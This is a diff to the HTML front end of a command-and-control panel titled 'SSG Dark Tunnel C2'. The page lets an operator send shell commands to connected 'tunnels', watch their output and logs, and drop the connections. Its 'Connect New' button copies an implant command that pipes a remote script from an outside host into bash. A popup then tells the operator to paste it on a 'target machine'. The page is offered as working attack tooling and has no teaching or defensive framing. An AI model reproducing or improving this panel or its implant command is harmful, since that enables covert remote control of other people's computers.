@@ -1,38 +1,132 @@
 <!DOCTYPE html>
-<html manifest="/manifest.json">
+<html>
 <head>
-    <title>SSG Dark Tunnel</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>SSG Dark Tunnel C2</title>
     <link rel="manifest" href="/manifest.json">
-    <meta name="theme-color" content="#000">
-    <style>body{font-family:monospace;background:#000;color:#0f0;padding:20px}</style>
+    <style>
+        * { margin:0; padding:0; box-sizing:border-box; }
+        body { 
+            font-family: 'Courier New', monospace; 
+            background: #000; 
+            color: #0f0; 
+            padding: 20px; 
+            min-height: 100vh;
+        }
+        .header { text-align:center; margin-bottom:30px; }
+        .status { 
+            background:#111; padding:15px; border-radius:8px; 
+            margin-bottom:20px; text-align:center; font-size:18px;
+        }
+        .tunnel-count { color:#0f0; font-weight:bold; font-size:24px; }
+        .controls { display:flex; gap:10px; margin-bottom:20px; flex-wrap:wrap; }
+        button { 
+            background:#0f0; color:#000; border:none; padding:12px 20px; 
+            border-radius:6px; cursor:pointer; font-family:inherit; font-weight:bold;
+        }
+        button:hover { background:#0cc; }
+        button:disabled { background:#333; cursor:not-allowed; }
+        input { 
+            flex:1; background:#111; color:#0f0; border:1px solid #0f0; 
+            padding:12px; border-radius:6px; font-family:inherit; min-width:200px;
+        }
+        .output { 
+            background:#111; padding:15px; border-radius:8px; 
+            height:400px; overflow:auto; white-space:pre-wrap; font-size:14px;
+            border:1px solid #0f0;
+        }
+        .logs { font-size:12px; margin-top:10px; }
+    </style>
 </head>
 <body>
-    <h1>🐙 SSG Dark Tunnel C2</h1>
-    <div id="status">Loading...</div>
-    <input id="cmd" placeholder="whoami" style="width:200px;background:#111;color:#0f0">
-    <button onclick="sendCmd()">Send</button>
-    <pre id="output"></pre>
+    <div class="header">
+        <h1>🐙 SSG Dark Tunnel C2</h1>
+        <div class="status" id="status">Loading...</div>
+    </div>
     
+    <div class="controls">
+        <input id="cmdInput" placeholder="Enter command (whoami, id, pwd...)" />
+        <button onclick="sendCommand()">Send Command</button>
+        <button onclick="connectTunnel()">Connect New</button>
+        <button onclick="disconnectAll()">Disconnect All</button>
+        <button onclick="refreshLogs()">Refresh Logs</button>
+    </div>
+    
+    <div style="display:flex; gap:20px;">
+        <div style="flex:1;">
+            <h3>Command Output</h3>
+            <div class="output" id="output"></div>
+        </div>
+        <div style="flex:1;">
+            <h3>Recent Logs</h3>
+            <div class="output logs" id="logs"></div>
+        </div>
+    </div>
+
     <script>
-    async function updateStatus() {
-        const res = await fetch('/status');
-        const data = await res.json();
-        document.getElementById('status').innerHTML = 
-            `Tunnels: ${data.tunnels || 0} | <a href="/logs">Logs</a> | <a href="/dashboard">Dashboard</a>`;
-    }
-    
-    async function sendCmd() {
-        const cmd = document.getElementById('cmd').value;
-        await fetch('/cmd', {
-            method: 'POST',
-            headers: {'Content-Type': 'application/json'},
-            body: JSON.stringify({payload: cmd})
-        });
+        let ws = null;
+        
+        async function updateStatus() {
+            try {
+                const res = await fetch('/status');
+                const data = await res.json();
+                const statusEl = document.getElementById('status');
+                statusEl.innerHTML = `
+                    <span class="tunnel-count">${data.tunnels || 0}</span> Active Tunnels
+                    | <a href="/logs" target="_blank">Raw Logs</a>
+                    | <a href="/tunnels" target="_blank">JSON</a>
+                `;
+            } catch(e) {}
+        }
+        
+        async function sendCommand() {
+            const cmd = document.getElementById('cmdInput').value;
+            if (!cmd) return;
+            
+            try {
+                const res = await fetch('/cmd', {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({payload: cmd})
+                });
+                const data = await res.json();
+                document.getElementById('output').textContent += `\n→ ${cmd}\n← ${data.status}\n`;
+                document.getElementById('cmdInput').value = '';
+            } catch(e) {
+                document.getElementById('output').textContent += `\n❌ Error: ${e}\n`;
+            }
+        }
+        
+        async function connectTunnel() {
+            const cmd = `curl -sL https://ssg-27mx.onrender.com/implant.sh | bash`;
+            navigator.clipboard.writeText(cmd);
+            alert(`Implant command copied!\n\n${cmd}\n\nPaste on target machine`);
+        }
+        
+        async function disconnectAll() {
+            const res = await fetch('/tunnels');
+            const tunnels = await res.json();
+            for (let id in tunnels) {
+                await fetch(`/tunnel/${id}`, {method: 'DELETE'});
+            }
+            updateStatus();
+        }
+        
+        async function refreshLogs() {
+            const res = await fetch('/logs');
+            document.getElementById('logs').textContent = await res.text();
+        }
+        
+        // Auto-refresh
+        setInterval(updateStatus, 3000);
+        setInterval(refreshLogs, 10000);
         updateStatus();
-    }
-    
-    setInterval(updateStatus, 2000);
-    updateStatus();
+        
+        // Enter key
+        document.getElementById('cmdInput').addEventListener('keypress', (e) => {
+            if (e.key === 'Enter') sendCommand();
+        });
     </script>
 </body>
 </html>
